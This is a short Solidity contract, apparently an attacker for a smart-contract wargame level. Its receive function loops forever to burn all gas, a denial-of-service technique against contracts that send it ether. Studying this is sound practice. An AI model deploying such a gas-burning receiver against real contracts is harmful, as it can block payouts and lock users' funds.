// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level20Attacker {
  receive() external payable {
      // assert should consume all fees, but not working now TODO: check solidity updates
      //assert(false);

      while(true) {
            // Burn all gas
      }
    }
}